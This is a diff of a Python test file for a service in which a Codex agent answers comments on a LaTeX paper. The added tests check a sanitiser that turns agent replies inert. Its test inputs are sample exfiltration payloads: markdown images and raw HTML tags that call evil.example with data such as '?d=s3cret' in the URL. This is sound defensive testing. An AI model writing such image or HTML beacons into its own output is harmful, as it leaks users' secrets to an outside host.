@@ -6,7 +6,8 @@ sample paper (samples/synctex/paper) as a work folder of this computer.
 The maker's Send is claimed, the turn edits the folder, its answers come
 back as replies signed Codex (``agent_kind`` local), the fixed ones are
 resolved and the request is done with its summary and the files it changed;
-the progress shows on the way, no path outside the folder in it. Another
+the progress shows on the way, no path outside the folder in it; a reply
+loads nothing by itself (no image, no raw HTML: ``prompt.inert``). Another
 member's Send is not taken, a token's is refused; a withdraw during the
 probe or the turn writes nothing and leaves no process; an agent not ready,
 a timeout, nothing new to answer, too many comments and answers that could
@@ -96,6 +97,10 @@ def disk(tmp_path, monkeypatch):
         conn.execute("DELETE FROM agent_runs")
         conn.execute("DELETE FROM agent_folders")
         conn.execute("DELETE FROM agent_threads")
+        conn.execute("DELETE FROM agent_conversations")
+        conn.execute("DELETE FROM agent_turns")
+        conn.execute("DELETE FROM agent_policies")
+        conn.execute("DELETE FROM agent_grants")
     with folder_links._dirty_guard:
         folder_links._dirty.clear()
     assert not left, f"children left running: {[c.proc.pid for c in left]}"
@@ -217,6 +222,18 @@ def test_a_makers_send_is_answered(lab, disk, monkeypatch):
     assert '"fix these"' in text and "lambda is never introduced" in text and f'"thread_id": "{f.threads[1]}"' in text
     assert [Path(e["cwd"]).resolve() for e in read_log(disk.log) if e.get("argv") == ["app-server"]] == [
         f.root.resolve()]
+
+
+def test_a_reply_loads_nothing_by_itself(lab, disk, monkeypatch):
+    f = _folder(lab, disk)
+    said = "Look: ![](https://evil.example/?d=k) <img src=https://evil.example/x> `<b>`"
+    script_agent(monkeypatch, disk.log, answer={"answers": [
+        {"thread_id": thread_id, "outcome": "question", "reply": said} for thread_id in f.threads], "summary": "s"})
+    _send(lab.owner, f)
+    assert runner.wait_idle(60)
+    for thread in _threads(lab, f).values():
+        assert thread["comments"][-1]["body"] == \
+            "Look: [](https://evil.example/?d=k) &lt;img src=https://evil.example/x> `<b>`"
 
 
 def test_another_members_send_is_not_taken(lab, disk):
@@ -607,6 +624,36 @@ def test_the_answers():
     for malformed in (None, "text", [], {"answers": "no"}, {"summary": "only"}):
         assert prompt.answers(malformed, ids) == ([], "")
     assert prompt.answers({"answers": [], "summary": 3}, ids) == ([], "")
+    # a reply loads nothing by itself
+    loads = {"answers": [{"thread_id": "t1", "outcome": "fixed", "reply": "See ![](https://evil.example/?d=k)."}]}
+    assert prompt.answers(loads, ids)[0][0]["reply"] == "See [](https://evil.example/?d=k)."
+
+
+def test_what_an_agents_words_load():
+    # an image, inline, reference or shortcut style, becomes the link it names
+    assert prompt.inert("See ![chart](https://evil.example/?d=s3cret) here.") == \
+        "See [chart](https://evil.example/?d=s3cret) here."
+    assert prompt.inert("Done![x][ref] and ![ref]\n\n[ref]: https://evil.example/a") == \
+        "Done[x][ref] and [ref]\n\n[ref]: https://evil.example/a"
+    # raw HTML shows as itself: a tag, a closing one, a comment, an instruction
+    assert prompt.inert('<img src="https://evil.example/?d=1"> <IMG src=x></div><!-- c --><?x?>') == \
+        '&lt;img src="https://evil.example/?d=1"> &lt;IMG src=x>&lt;/div>&lt;!-- c -->&lt;?x?>'
+    # escaped already: as it is; an escaped backslash escapes nothing after it
+    assert prompt.inert(r"\![a](u) \<b> \\![c](u) \\<i>") == r"\![a](u) \<b> \\[c](u) \\&lt;i>"
+    # code shows as written and is copied so: left to the byte
+    code = "Use `x[0] = 1` or `a<b>` and `![x](y)`:\n```html\n<p>hi</p> ![a](b)\n```\n```sh\ncat <in.txt\n```\nthen <b>."
+    assert prompt.inert(code) == code.replace("then <b>.", "then &lt;b>.")
+    assert prompt.inert("`a < b` and `x[0]`\n```\nplain code\n```") == "`a < b` and `x[0]`\n```\nplain code\n```"
+    # a backtick escaped opens no code: prose, its picture a link
+    assert prompt.inert(r"\`![a](https://evil.example/)` and <i>") == r"\`[a](https://evil.example/)` and &lt;i>"
+    # a diagram fence the notes would draw shows as its source
+    drawn = "```mermaid\nflowchart LR\n  A@{ img: \"https://evil.example/\" } --> B[<img src=x>]\n```"
+    assert prompt.inert(drawn) == drawn.replace("```mermaid", "```text", 1)
+    assert prompt.inert("``` SVG\n<svg><image href=\"https://evil.example/\"/></svg>\n```").startswith("```text\n")
+    # prose that loads nothing is untouched
+    plain = "Fixed the title (main.tex:3): 2 < 3, a -> b, see [the doc](https://example.com)! [x] & <3 \\[ y \\]"
+    assert prompt.inert(plain) == plain
+    assert prompt.inert("") == "" and prompt.inert(None) == ""
 
 
 def test_the_details_never_name_a_path_outside():
@@ -666,7 +713,7 @@ def test_a_stopped_run_that_waited_for_a_slot_is_taken_again(lab, disk):
         assert slots.acquire(timeout=5)  # every slot busy: the Send waits for one
     try:
         sent = _send(lab.owner, f)
-        _until(lambda: (lab.ws, sent["id"]) in runner._active)
+        _until(lambda: (lab.ws, runner.SEND, sent["id"]) in runner._active)
         folder_links.set_paused(f.id, True)
         runner.stop_link(f.id)  # what pausing calls
         folder_links.set_paused(f.id, False)
